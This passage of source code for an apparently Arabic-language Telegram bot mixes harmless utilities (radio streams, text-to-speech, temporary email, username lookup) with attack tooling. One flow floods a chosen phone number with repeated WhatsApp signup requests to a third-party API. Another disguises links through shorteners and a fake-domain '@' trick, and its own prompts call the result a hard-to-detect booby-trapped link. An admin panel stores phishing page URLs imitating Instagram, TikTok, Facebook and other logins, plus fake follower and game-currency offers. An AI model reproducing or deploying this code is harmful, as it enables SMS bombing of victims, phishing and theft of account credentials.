        ];

        const results = [];
        for (const site of social_media) {
            const url = site.url.replace("{}", username);
            try {
                const response = await axios.get(url, { 
                    timeout: 5000,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
                    },
                    validateStatus: function (status) {
                        return status < 500; 
                    }
                });
                if (response.status === 200) {
                    results.push(`✅ | الموقع: ${site.name}\n📲 | الرابط: ${url}\n`);
                } else {
                    results.push(`❌ | الموقع: ${site.name}\nاسم المستخدم غير موجود\n`);
                }
            } catch (error) {
                results.push(`⚠️ | الموقع: ${site.name}\nفشل الاتصال\n`);
            }
        }

        const chunk_size = 10;
        for (let i = 0; i < results.length; i += chunk_size) {
            const chunk = results.slice(i, i + chunk_size);
            await bot.sendMessage(message.chat.id, chunk.join("\n"));
        }

        bot.sendMessage(message.chat.id, "✅ تم الانتهاء من البحث عن اسم المستخدم في جميع المواقع المدعومة.");
    } catch (error) {
        bot.sendMessage(message.chat.id, `حدث خطأ: ${error.message}`);
    }
}
const countryTranslation = {
  "United Arab Emirates": "الإمارات 🇦🇪",
  "Saudi Arabia": "السعودية 🇸🇦",
  "Yemen": "اليمن 🇾🇪👑",
  "Egypt": "مصر 🇪🇬",
  "Jordan": "الأردن 🇯🇴",
  "Qatar": "قطر 🇶🇦",
  "Bahrain": "البحرين 🇧🇭",
  "Kuwait": "الكويت 🇰🇼",
  "Oman": "عمان 🇴🇲",
  "Lebanon": "لبنان 🇱🇧",
  "Syria": "سوريا 🇸🇾",
  "Iraq": "العراق 🇮🇶",
  "Tunisia": "تونس 🇹🇳",
  "Morocco": "المغرب 🇲🇦",
  "Algeria": "الجزائر 🇩🇿",
  "Sudan": "السودان 🇸🇩",
  "Palestine": "فلسطين 🇵🇸",
  "Libya": "ليبيا 🇱🇾",
  "Mauritania": "موريتانيا 🇲🇷",
  "Somalia": "الصومال 🇸🇴",
  "Djibouti": "جيبوتي 🇩🇯",
  "Comoros": "جزر القمر 🇰🇲",
  "Afghanistan": "أفغانستان 🇦🇫",
  "Argentina": "الأرجنتين 🇦🇷",
  "Armenia": "أرمينيا 🇦🇲",
  "Australia": "أستراليا 🇦🇺",
  "Austria": "النمسا 🇦🇹",
  "Azerbaijan": "أذربيجان 🇦🇿",
  "Belarus": "بيلاروس 🇧🇾",
  "Belgium": "بلجيكا 🇧🇪",
  "Bangladesh": "بنغلاديش 🇧🇩",
  "Belize": "بليز 🇧🇿",
  "Benin": "بنين 🇧🇯",
  "Bolivia": "بوليفيا 🇧🇴",
  "Bosnia and Herzegovina": "البوسنة والهرسك 🇧🇦",
  "Botswana": "بوتسوانا 🇧🇼",
  "Brazil": "البرازيل 🇧🇷",
  "Bulgaria": "بلغاريا 🇧🇬",
  "Burkina Faso": "بوركينا فاسو 🇧🇫",
  "Cambodia": "كمبوديا 🇰🇭",
  "Cameroon": "الكاميرون 🇨🇲",
  "Canada": "كندا 🇨🇦",
  "Chile": "تشيلي 🇨🇱",
  "China": "الصين 🇨🇳",
  "Colombia": "كولومبيا 🇨🇴",
  "Costa Rica": "كوستاريكا 🇨🇷",
  "Croatia": "كرواتيا 🇭🇷",
  "Cuba": "كوبا 🇨🇺",
  "Cyprus": "قبرص 🇨🇾",
  "Czech Republic": "التشيك 🇨🇿",
  "Denmark": "الدنمارك 🇩🇰",
  "Ecuador": "الإكوادور 🇪🇨",
  "Estonia": "إستونيا 🇪🇪",
  "Finland": "فنلندا 🇫🇮",
  "France": "فرنسا 🇫🇷",
  "Germany": "ألمانيا 🇩🇪",
  "Ghana": "غانا 🇬🇭",
  "Greece": "اليونان 🇬🇷",
  "Guatemala": "غواتيمالا 🇬🇹",
  "Honduras": "هندوراس 🇭🇳",
  "Hungary": "المجر 🇭🇺",
  "Iceland": "آيسلندا 🇮🇸",
  "India": "الهند 🇮🇳",
  "Indonesia": "إندونيسيا 🇮🇩",
  "Iran": "إيران 🇮🇷",
  "Ireland": "أيرلندا 🇮🇪",
  "Israel": "إسرائيل 🇮🇱",
  "Italy": "إيطاليا 🇮🇹",
  "Ivory Coast": "ساحل العاج 🇨🇮",
  "Jamaica": "جامايكا 🇯🇲",
  "Japan": "اليابان 🇯🇵",
  "Kazakhstan": "كازاخستان 🇰🇿",
  "Kenya": "كينيا 🇰🇪",
  "South Korea": "كوريا الجنوبية 🇰🇷",
  "North Korea": "كوريا الشمالية 🇰🇵",
  "Kosovo": "كوسوفو 🇽🇰",
  "Laos": "لاوس 🇱🇦",
  "Latvia": "لاتفيا 🇱🇻",
  "Lithuania": "ليتوانيا 🇱🇹",
  "Luxembourg": "لوكسمبورغ 🇱🇺",
  "Madagascar": "مدغشقر 🇲🇬",
  "Malaysia": "ماليزيا 🇲🇾",
  "Malta": "مالطا 🇲🇹",
  "Mexico": "المكسيك 🇲🇽",
  "Moldova": "مولدوفا 🇲🇩",
  "Monaco": "موناكو 🇲🇨",
  "Mongolia": "منغوليا 🇲🇳",
  "Montenegro": "الجبل الأسود 🇲🇪",
  "Nepal": "نيبال 🇳🇵",
  "Netherlands": "هولندا 🇳🇱",
  "New Zealand": "نيوزيلندا 🇳🇿",
  "Nicaragua": "نيكاراغوا 🇳🇮",
  "Nigeria": "نيجيريا 🇳🇬",
  "Norway": "النرويج 🇳🇴",
  "Pakistan": "باكستان 🇵🇰",
  "Panama": "بنما 🇵🇦",
  "Paraguay": "باراغواي 🇵🇾",
  "Peru": "بيرو 🇵🇪",
  "Philippines": "الفلبين 🇵🇭",
  "Poland": "بولندا 🇵🇱",
  "Portugal": "البرتغال 🇵🇹",
  "Romania": "رومانيا 🇷🇴",
  "Russia": "روسيا 🇷🇺",
  "Rwanda": "رواندا 🇷🇼",
  "Senegal": "السنغال 🇸🇳",
  "Serbia": "صربيا 🇷🇸",
  "Singapore": "سنغافورة 🇸🇬",
  "Slovakia": "سلوفاكيا 🇸🇰",
  "Slovenia": "سلوفينيا 🇸🇮",
  "South Africa": "جنوب أفريقيا 🇿🇦",
  "Spain": "إسبانيا 🇪🇸",
  "Sri Lanka": "سريلانكا 🇱🇰",
  "Sweden": "السويد 🇸🇪",
  "Switzerland": "سويسرا 🇨🇭",
  "Tanzania": "تنزانيا 🇹🇿",
  "Thailand": "تايلاند 🇹🇭",
  "Trinidad and Tobago": "ترينيداد وتوباغو 🇹🇹",
  "Turkey": "تركيا 🇹🇷",
  "Uganda": "أوغندا 🇺🇬",
  "Ukraine": "أوكرانيا 🇺🇦",
  "United Kingdom": "المملكة المتحدة 🇬🇧",
  "United States": "الولايات المتحدة 🇺🇸",
  "Uruguay": "أوروغواي 🇺🇾",
  "Uzbekistan": "أوزبكستان 🇺🇿",
  "Venezuela": "فنزويلا 🇻🇪",
  "Vietnam": "فيتنام 🇻🇳",
  "Zambia": "زامبيا 🇿🇲",
  "Zimbabwe": "زيمبابوي 🇿🇼",
  "Antigua and Barbuda": "أنتيغوا وبربودا 🇦🇬",
  "Saint Kitts and Nevis": "سانت كيتس ونيفيس 🇰🇳",
  "Dominica": "دومينيكا 🇩🇲",
  "Saint Lucia": "سانت لوسيا 🇱🇨",
  "Grenada": "غرينادا 🇬🇩",
  "Bahamas": "الباهاماس 🇧🇸",
  "Barbados": "باربادوس 🇧🇧",
  "Saint Vincent and the Grenadines": "سانت فنسنت والغرينادين 🇻🇨",
  "Jamaica": "جامايكا 🇯🇲",
  "Haiti": "هايتي 🇭🇹",
  "Cuba": "كوبا 🇨🇺",
  "Guyana": "غيانا 🇬🇾",
  "Suriname": "سورينام 🇸🇷",
  "Vatican City": "الفاتيكان 🇻🇦",
  "Andorra": "أندورا 🇦🇩",
  "San Marino": "سان مارينو 🇸🇲",
  "Liechtenstein": "ليختنشتاين 🇱🇮",
  "Maldives": "المالديف 🇲🇻",
  "Fiji": "فيجي 🇫🇯",
  "Papua New Guinea": "بابوا غينيا الجديدة 🇵🇬",
  "Samoa": "ساموا 🇼🇸",
  "Tonga": "تونغا 🇹🇴",
  "Vanuatu": "فانواتو 🇻🇺",
  "Solomon Islands": "جزر سليمان 🇸🇧",
  "Micronesia": "ميكرونيزيا 🇫🇲",
  "Palau": "بالاو 🇵🇼",
  "Marshall Islands": "جزر مارشال 🇲🇭",
  "Kiribati": "كيريباس 🇰🇮",
  "Nauru": "ناورو 🇳🇷",
  "Tuvalu": "توفالو 🇹🇻"
};

async function getCountries() {
  try {
    const response = await axios.get('https://de1.api.radio-browser.info/json/countries');
    const countries = response.data;
    return countries
      .filter((country) => country.stationcount > 0)
      .map((country) => country.name)
      .sort();
  } catch (error) {
    console.error('خطأ في جلب الدول:', error);
    return [];
  }
}

async function getStations(country) {
  try {
    const response = await axios.get(`https://de1.api.radio-browser.info/json/stations/bycountry/${country}`, {
      params: {
        limit: 20,
        order: 'popularity',
        reverse: 'true'
      }
    });
    return response.data;
  } catch (error) {
    console.error('خطأ في جلب محطات الراديو:', error);
    return [];
  }
}

function showRadioCountryList(chatId, startIndex = 0) {
  const buttons = [];
  const countryCodes = Object.keys(countryTranslation);
  const countryNames = Object.values(countryTranslation);

  const endIndex = Math.min(startIndex + 70, countryCodes.length);

  for (let i = startIndex; i < endIndex; i += 3) {
    const row = [];
    for (let j = i; j < i + 3 && j < endIndex; j++) {
      const code = countryCodes[j];
      const name = countryNames[j];
      row.push({ text: name, callback_data: `radio_country_${code}` });  // تعديل هنا
    }
    buttons.push(row);
  }

  const navigationButtons = [];
  if (startIndex > 0) {
    navigationButtons.push({ text: "السابق", callback_data: `prev_${startIndex - 70}` });
  }
  if (endIndex < countryCodes.length) {
    navigationButtons.push({ text: "التالي", callback_data: `next_${endIndex}` });
  }

  if (navigationButtons.length) {
    buttons.push(navigationButtons);
  }

  bot.sendMessage(chatId, "اختر الدولة لاختراق بث الراديو:", {
    reply_markup: {
      inline_keyboard: buttons
    }
  });
}

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;

  if (query.data === 'radio_stations') {
    showRadioCountryList(chatId); // عرض قائمة الدول للراديو
  } else if (query.data.startsWith('radio_country_')) {  // تعديل هنا
    const countryCode = query.data.split('_')[2];  // الحصول على كود الدولة من `radio_country_`
    const arabicName = countryTranslation[countryCode] || countryCode;

    const stations = await getStations(countryCode);
    if (stations.length > 0) {
      let message = `محطات الراديو المتاحة في ${arabicName}:\n\n`;
      stations.forEach((station) => {
        message += `اسم المحطة: ${station.name}\n`;
        message += `رابط البث: ${station.url}\n\n`;
      });
      bot.sendMessage(chatId, message);
    } else {
      bot.sendMessage(chatId, `عذرًا، لم نتمكن من العثور على محطات راديو لـ ${arabicName}.`);
    }
  } else if (query.data.startsWith('next_')) {
    const nextIndex = parseInt(query.data.split('_')[1], 10);
    showRadioCountryList(chatId, nextIndex);
  } else if (query.data.startsWith('prev_')) {
    const prevIndex = parseInt(query.data.split('_')[1], 10);
    showRadioCountryList(chatId, prevIndex);
  }
});

const VOICERSS_API_KEY = 'cbee32ada8744ab299d7178348b0c6f3';

async function convertTextToMaleVoice(text) {
  const voice = 'ar-sa_male'; // صوت ذكر
  const url = `https://api.voicerss.org/?key=${VOICERSS_API_KEY}&hl=ar-sa&src=${encodeURIComponent(text)}&v=${voice}&f=44khz_16bit_stereo`;
  return url; // إعادة الرابط مباشرة
}

async function convertTextToFemaleVoice(text) {
  const url = googleTTS.getAudioUrl(text, {
    lang: 'ar', // اللغة العربية
    slow: false,
    host: 'https://translate.google.com',
  });
  return url; 
}

async function sendAudioFromUrl(bot, chatId, url) {
  return new Promise((resolve, reject) => {
    https.get(url, (response) => {
      if (response.statusCode !== 200) {
        reject(new Error(`Failed to download audio: ${response.statusCode}`));
        return;
      }
      bot.sendVoice(chatId, response).then(resolve).catch(reject);
    }).on('error', reject);
  });
}

bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;

  if (callbackQuery.data === 'convert_text') {
    bot.sendMessage(chatId, 'اختر نوع الصوت:', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'صوت ذكر', callback_data: 'male_voice' }],
          [{ text: 'صوت أنثى', callback_data: 'female_voice' }]
        ]
      }
    });
  } else if (callbackQuery.data === 'male_voice' || callbackQuery.data === 'female_voice') {
    const gender = callbackQuery.data === 'male_voice' ? 'male' : 'female';
    const genderText = gender === 'male' ? 'ذكر' : 'أنثى';

    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
      chat_id: chatId,
      message_id: callbackQuery.message.message_id
    });

    bot.sendMessage(chatId, `الآن أرسل النص الذي تريد تحويله إلى صوت بصوت ${genderText}.`);

    bot.once('message', async (msg) => {
      const text = msg.text;

      try {
        let ttsUrl;

        if (gender === 'male') {
        
          ttsUrl = await convertTextToMaleVoice(text);
        } else {
        
          ttsUrl = await convertTextToFemaleVoice(text);
        }

        await sendAudioFromUrl(bot, chatId, ttsUrl);
      } catch (error) {
        console.error('Error:', error);
        bot.sendMessage(chatId, 'حدث خطأ أثناء تحويل النص إلى صوت.');
      }
    });
  }
});

const BASE_URL = 'https://www.1secmail.com/api/v1/';

let emailAddress = null;

// دالة لإنشاء اسم عشوائي
function generateRandomName(length = 2) {
  return Array.from({ length }, () => Math.floor(Math.random() * 10)).join('');
}

function createEmail() {
  const randomPart = generateRandomName();
  const domain = '1secmail.com';
  emailAddress = `sjgdsoft${randomPart}@${domain}`;
  return emailAddress;
}

async function getMessages() {
  if (!emailAddress) return null;
  
  const [username, domain] = emailAddress.split('@');
  const messagesUrl = `${BASE_URL}?action=getMessages&login=${username}&domain=${domain}`;
  
  try {
    const response = await axios.get(messagesUrl);
    return response.data;
  } catch (error) {
    console.error('Error fetching messages:', error);
    return null;
  }
}

async function getMessageContent(messageId) {
  if (!emailAddress) return null;
  
  const [username, domain] = emailAddress.split('@');
  const contentUrl = `${BASE_URL}?action=readMessage&login=${username}&domain=${domain}&id=${messageId}`;
  
  try {
    const response = await axios.get(contentUrl);
    return response.data;
  } catch (error) {
    console.error('Error fetching message content:', error);
    return null;
  }
}


function cleanHtml(rawHtml) {
  return rawHtml.replace(/<[^>]*>?/gm, '');
}

bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === 'create_email') {
    const instructions = `يمكنك إنشاء إيميل وهمي عن طريق اتباع الأوامر التالية:

لإنشاء إيميل وهمي: /email

لإظهار الإيميل الذي تم إنشاؤه: /an

لعرض الرسائل التي تم استلامها: /Messages

لحذف الإيميل السابق: /de

يرجى اتباع هذه الأوامر للاستفادة من الخدمة.`;
    
    bot.editMessageText(instructions, {
      chat_id: chatId,
      message_id: callbackQuery.message.message_id,
      parse_mode: 'Markdown'
    });
  }
});

bot.onText(/\/email/, (msg) => {
  const chatId = msg.chat.id;
  const newEmail = createEmail();
  bot.sendMessage(chatId, `تم إنشاء البريد المؤقت بنجاح!\n\nالبريد الإلكتروني: \`${newEmail}\`\n\nيمكنك نسخ البريد الإلكتروني بالضغط عليه.`, {
    parse_mode: 'Markdown'
  });
});

bot.onText(/\/an/, (msg) => {
  const chatId = msg.chat.id;
  if (emailAddress) {
    bot.sendMessage(chatId, `البريد الإلكتروني الحالي هو:\n\`${emailAddress}\``, {
      parse_mode: 'Markdown'
    });
  } else {
    bot.sendMessage(chatId, 'لم يتم إنشاء بريد إلكتروني بعد. استخدم الأمر /email لإنشاء بريد جديد.');
  }
});

bot.onText(/\/Messages/, async (msg) => {
  const chatId = msg.chat.id;
  const messages = await getMessages();
  
  if (messages && messages.length > 0) {
    for (const message of messages) {
      const messageContent = await getMessageContent(message.id);
      if (messageContent) {
        const fromEmail = messageContent.from;
        const subject = messageContent.subject;
        const body = cleanHtml(messageContent.body);
        const responseText = `من: ${fromEmail}\nالموضوع: ${subject}\n\nمحتوى الرسالة: ${body}\n\n---`;
        bot.sendMessage(chatId, responseText);
      }
    }
  } else {
    bot.sendMessage(chatId, 'لا توجد رسائل جديدة أو لم يتم إنشاء بريد مؤقت بعد.');
  }
});

bot.onText(/\/de/, (msg) => {
  const chatId = msg.chat.id;
  if (emailAddress) {
    emailAddress = null;
    bot.sendMessage(chatId, 'تم حذف البريد الإلكتروني بنجاح.');
  } else {
    bot.sendMessage(chatId, 'لا يوجد بريد إلكتروني لحذفه.');
  }
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id; 
    if (!allUsers[chatId]) {
        allUsers[chatId] = {
            step: 'initial',
            GOOD: 0,
            BAD: 0,
            messageId: null
        };
    }

    if (query.data === 'whatsapp_spam') {
        allUsers[chatId].step = 'country_code';
        bot.sendMessage(chatId, "أدخل رمز الدولة (بدون +):");
    }
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!allUsers[chatId]) return; 

    const userStep = allUsers[chatId].step;

    switch (userStep) {
        case 'country_code':
            if (text.startsWith('/')) return; 
            allUsers[chatId].countryCode = text;
            allUsers[chatId].step = 'phone_number';
            bot.sendMessage(chatId, "أدخل رقم الهاتف:");
            break;

        case 'phone_number':
            allUsers[chatId].phoneNumber = text;
            allUsers[chatId].step = 'proxy';
            bot.sendMessage(chatId, "أدخل البروكسي (اختياري، اكتب 'لا' إذا لم يكن لديك بروكسي):");
            break;

        case 'proxy':
            allUsers[chatId].proxy = text.toLowerCase() === 'لا' ? null : text;
            allUsers[chatId].step = 'sending_requests';
            startSendingRequests(chatId, allUsers[chatId]);
            break;
    }
});

// بدء إرسال الطلبات
async function startSendingRequests(chatId, userData) {
    console.clear();
    const initialMessage = await bot.sendMessage(chatId, "بدأ إرسال الطلبات...\nSuccess: 0\nFailed: 0");
    userData.messageId = initialMessage.message_id;

    const sendRequest = async () => {
        try {
            const url = "https://gw.abgateway.com/student/whatsapp/signup";
            const headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
                'Accept': "application/json",
                'Content-Type': "application/json",
                'x-trace-id': `guest_user:${Math.floor(Math.random() * 900000) + 100000}`,
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': "?1",
                'access-control-allow-origin': "*",
                'platform': "web",
                'sec-ch-ua-platform': '"Android"',
                'origin': "https://abwaab.com",
                'sec-fetch-site': "cross-site",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://abwaab.com/",
                'accept-language': "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
                'priority': "u=1, i"
            };

            const payload = {
                language: "ar",
                password: "12341ghf23",
                phone: `+${userData.countryCode}${userData.phoneNumber}`,
                country_code: userData.countryCode,
                platform: "web"
            };

            const response = await axios.post(url, payload, { headers, proxy: userData.proxy ? { host: userData.proxy } : undefined });

            if (response.status === 200) {
                userData.GOOD++;
            } else {
                userData.BAD++;
            }

          
            await bot.editMessageText(`بدأ إرسال الطلبات...\nتم الارسال بنجاح: ${userData.GOOD}\nفشل الارسال: ${userData.BAD}`, {
                chat_id: chatId,
                message_id: userData.messageId
            });

            await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 1000));
        } catch (error) {
            userData.BAD++;
            await bot.editMessageText(`بدأ إرسال الطلبات...\nتم الارسال بنجاح: ${userData.GOOD}\nفشل الارسال: ${userData.BAD}\nError: ${error.message}`, {
                chat_id: chatId,
                message_id: userData.messageId
            });
        }
    };

    const promises = [];
    for (let i = 0; i < 10; i++) {
        promises.push(sendRequest());
    }

    await Promise.all(promises);
}


function validateWebUrl(url) {
    try {
        if (!url.startsWith('https://')) {
            throw new Error("الرابط يجب أن يبدأ بـ 'https://'");
        }
        if (url.endsWith('/')) {
            throw new Error("الرابط لا يجب أن ينتهي بـ '/'");
        }
        new URL(url);
        return true;
    } catch (error) {
        throw new Error("صيغة الرابط غير صحيحة");
    }
}

function validateCustomDomain(domain) {
    const domainRegex = /^(?!-)[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,}$/;
    if (!domainRegex.test(domain)) {
        throw new Error("صيغة النطاق المخصص غير صحيحة");
    }
    if (domain.includes('://') || domain.includes('/')) {
        throw new Error("النطاق لا يجب أن يحتوي على البروتوكول أو الشرطات");
    }
    return true;
}

function validatePhishingKeywords(keywords) {
    if (keywords.length > 15) {
        throw new Error("الكلمات الرئيسية لا يجب أن تتجاوز 15 حرفًا");
    }
    if (keywords.includes(' ')) {
        throw new Error("الكلمات الرئيسية لا يجب أن تحتوي على مسافات. استخدم '-' للفصل بينها");
    }
    return keywords;
}

const urlShorteners = [
    {
        name: 'TinyURL',
        async shorten(url) {
            const response = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
            return response.data;
        }
    },
    {
        name: 'Is.gd',
        async shorten(url) {
            const response = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`);
            return response.data;
        }
    },
    {
        name: 'Clck.ru',
        async shorten(url) {
            const response = await axios.get(`https://clck.ru/--?url=${encodeURIComponent(url)}`);
            return response.data;
        }
    },
    {
        name: 'Da.gd',
        async shorten(url) {
            const response = await axios.get(`https://da.gd/s?url=${encodeURIComponent(url)}`);
            return response.data;
        }
    }
];

async function shortenUrl(url) {
    let shortUrls = [];
    for (const shortener of urlShorteners) {
        try {
            const shortUrl = await shortener.shorten(url);
            shortUrls.push(shortUrl);
        } catch (error) {
            console.error(`خطأ مع ${shortener.name}:`, error.message);
        }
    }
    return shortUrls;
}

function maskUrl(domain, keyword, url) {
    const urlObj = new URL(url);
    return `${urlObj.protocol}//${domain}-${keyword}@${urlObj.host}${urlObj.pathname}`;
}



function displayProgress(bot, chatId, message) {
    let progress = 0;
    const progressBar = ["░░░░░░░░░░", "▓░░░░░░░░░", "▓▓░░░░░░░░", "▓▓▓░░░░░░░", "▓▓▓▓░░░░░░", "▓▓▓▓▓░░░░░", "▓▓▓▓▓▓░░░░", "▓▓▓▓▓▓▓░░░", "▓▓▓▓▓▓▓▓░░", "▓▓▓▓▓▓▓▓▓░", "▓▓▓▓▓▓▓▓▓▓"];

    return setInterval(async () => {
        if (progress >= 10) {
            progress = 0;
        } else {
            progress++;
        }

        await bot.editMessageText(`Hidelink...\n[${progressBar[progress]}] ${progress * 10}%`, {
            chat_id: chatId,
            message_id: message.message_id
        });
    }, 500);
}


bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'hide_url') {
        allUsers[chatId] = { step: 0 };
        bot.sendMessage(chatId, "الرجاء إدخال الرابط الأصلي الذي تريد إخفاءه (مثال: https://example.com):");
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text.startsWith('/')) return;

    if (!allUsers[chatId]) {
        return;
    }

    try {
        switch(allUsers[chatId].step) {
            case 0:
                validateWebUrl(text);
                allUsers[chatId].url = text;
                allUsers[chatId].step = 1;
                bot.sendMessage(chatId, "أدخل الاسم او النطاق  المخصص (مثال: nstagram.com):");
                break;

            case 1:
                validateCustomDomain(text);
                allUsers[chatId].domain = text;
                allUsers[chatId].step = 2;
                bot.sendMessage(chatId, "أدخل الكلمات الرئيسية (مثال: -sjgd-login):");
                break;

            case 2:
                const keywords = validatePhishingKeywords(text);
                let progressMessage = await bot.sendMessage(chatId, "Hidelink  ...\n[░░░░░░░░░░] 0%");
                const interval = displayProgress(bot, chatId, progressMessage);

                const shortUrls = await shortenUrl(allUsers[chatId].url);
                clearInterval(interval);
                await bot.deleteMessage(chatId, progressMessage.message_id);

                if (shortUrls.length === 0) {
                    throw new Error("فشل في تقصير الرابط باستخدام أي خدمة");
                }

                let response = `الرابط الأصلي: ${allUsers[chatId].url}\n\n`;
                response += `[~] الروابط المقنعة بل الاسم والنطاق الذي قمت بختيارها الان اصبح الرابط مقنع اكثر ويصعب اكتشافه (باستخدام تقنيات متعددة لاخفا الرابط الملغم):\n`;

                shortUrls.forEach((shortUrl, index) => {
                    try {
                        const maskedUrl = maskUrl(allUsers[chatId].domain, keywords, shortUrl);
                        response += `╰➤ مختصر ${index + 1}: ${maskedUrl}\n`;
                    } catch (error) {
                        console.error(`خطأ في إخفاء الرابط ${index + 1}:`, error.message);
                    }
                });

                await bot.sendMessage(chatId, response);
                allUsers[chatId] = null;
                break;
        }
    } catch (error) {
        const errorMessage = error.message || "حدث خطأ غير متوقع";
        await bot.sendMessage(chatId, `خطأ: ${errorMessage}`);
    }
});


process.on('unhandledRejection', (error) => {
    console.error('Unhandled promise rejection:', error);
});

// --- نظام إدارة روابط الصفحات /ee
let pageLinks = {
    // روابط تسجيل الدخول
    login: {
        instagram: 'https://shrill-pond-f944.rwks332.workers.dev/Instagram',
        tiktok: 'https://shrill-pond-f944.rwks332.workers.dev/tiktok',
        youtube: 'ikfkfk',
        snapchat: 'https://shrill-pond-f944.rwks332.workers.dev/Snapchat',
        twitter: 'https://shrill-pond-f944.rwks332.workers.dev/twitter',
        facebook: 'https://shy-hat-1d02.rwks332.workers.dev/facebook'
    },
    // روابط زيادة المتابعين
    increase: {
        instagram: 'https://broad-rain-c26a.rwks332.workers.dev/insta',
        tiktok: 'https://jolly-cherry-113b.rwks332.workers.dev/tik',
        youtube: 'https://jolly-cherry-113b.rwks332.workers.dev/yot',
        snapchat: 'https://jolly-cherry-113b.rwks332.workers.dev/snap',
        twitter: 'https://jolly-cherry-113b.rwks332.workers.dev/twitter',
        facebook: 'https://jolly-cherry-113b.rwks332.workers.dev/face'
    },
    // روابط الألعاب
    games: {
        pubg_uc: 'https://square-voice-fd81.rwks332.workers.dev/bobji',
        free_fire_diamonds: 'https://still-dream-0031.rwks332.workers.dev/free',
        toptop_coins: 'https://white-bonus-9981.rwks332.workers.dev/top'
    }
};

// دالة لحفظ الروابط
async function savePageLinks() {
    try {
        await saveData('pageLinks', pageLinks);
        console.log('✅ تم حفظ روابط الصفحات بنجاح');
    } catch (error) {
        console.error('❌ خطأ في حفظ روابط الصفحات:', error);
    }
}

// دالة لتحميل الروابط
async function loadPageLinks() {
    const savedLinks = await loadData('pageLinks');
    if (savedLinks) {
        pageLinks = savedLinks;
        console.log('✅ تم تحميل روابط الصفحات:', pageLinks);
    }
}


function getPlatformNameAr(platform) {
    const names = {
        instagram: 'انستغرام',
        tiktok: 'تيك توك',
        youtube: 'يوتيوب',
        snapchat: 'سناب شات',
        twitter: 'تويتر',
        facebook: 'فيسبوك',
        pubg_uc: 'ببجي',
        free_fire_diamonds: 'فري فاير',
        toptop_coins: 'توب توب'
    };
    return names[platform] || platform;
}


function getSectionNameAr(section) {
    const names = {
        login: '🔐 تسجيل دخول',
        increase: '📈 زيادة متابعين',
        games: '🎮 ألعاب'
    };
    return names[section] || section;
}

// أمر /ee - يظهر الأقسام الرئيسية
bot.onText(/\/ee/, async (msg) => {
    const userId = msg.from.id.toString();
    
    // التحقق من أن المستخدم مشرف
    if (!isAdmin(userId)) {
        return bot.sendMessage(msg.chat.id, '❌ هذا الأمر متاح فقط للمشرفين.');
    }

    // الأزرار الرئيسية (3 أزرار)
    const mainKeyboard = {
        inline_keyboard: [
            [
                { text: '🔐 روابط تسجيل الدخول', callback_data: 'section_login' },
                { text: '📈 روابط زيادة المتابعين', callback_data: 'section_increase' }
            ],
            [
                { text: '🎮 روابط الألعاب', callback_data: 'section_games' }
            ]
        ]
    };

    await bot.sendMessage(msg.chat.id, '🔗 **لوحة تحكم الروابط**\nاختر القسم الذي تريد تعديل روابطه:', {
        parse_mode: 'Markdown',
        reply_markup: mainKeyboard
    });
});

// معالج واحد لكل الأزرار
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id.toString();
    const data = query.data;

    // ===== 1️⃣ التحقق من صلاحية التعديل للأقسام =====
    if ((data.startsWith('section_') || data.startsWith('edit_link_') || data === 'back_to_sections')) {
        if (!isAdmin(userId)) {
            return bot.answerCallbackQuery(query.id, { text: '❌ غير مصرح', show_alert: true });
        }
    }

    // ===== 2️⃣ معالج العودة للأقسام الرئيسية =====
    if (data === 'back_to_sections') {
        const mainKeyboard = {
            inline_keyboard: [
                [
                    { text: '🔐 روابط تسجيل الدخول', callback_data: 'section_login' },
                    { text: '📈 روابط زيادة المتابعين', callback_data: 'section_increase' }
                ],
                [
                    { text: '🎮 روابط الألعاب', callback_data: 'section_games' }
                ]
            ]
        };

        await bot.editMessageText('🔗 **لوحة تحكم الروابط**\nاختر القسم الذي تريد تعديل روابطه:', {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown',
            reply_markup: mainKeyboard
        });
        return bot.answerCallbackQuery(query.id);
    }

 
    if (data.startsWith('section_')) {
        const section = data.replace('section_', '');
        const platforms = Object.keys(pageLinks[section] || {});
        
        if (platforms.length === 0) {
            return bot.sendMessage(chatId, `لا توجد منصات في قسم ${getSectionNameAr(section)}`);
        }

        // إنشاء أزرار المنصات
        const keyboard = [];
        for (let i = 0; i < platforms.length; i += 2) {
            const row = [];
            row.push({ 
                text: `📱 ${getPlatformNameAr(platforms[i])}`, 
                callback_data: `edit_link_${section}_${platforms[i]}` 
            });
            
            if (i + 1 < platforms.length) {
                row.push({ 
                    text: `📱 ${getPlatformNameAr(platforms[i + 1])}`, 
                    callback_data: `edit_link_${section}_${platforms[i + 1]}` 
                });
            }
            keyboard.push(row);
        }

        // زر العودة
        keyboard.push([{ text: '🔙 العودة للأقسام الرئيسية', callback_data: 'back_to_sections' }]);

        // تعديل الرسالة الحالية
        await bot.editMessageText(`🔗 **قسم ${getSectionNameAr(section)}**\nاختر المنصة التي تريد تعديل رابطها:`, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: keyboard }
        });
        return bot.answerCallbackQuery(query.id);
    }

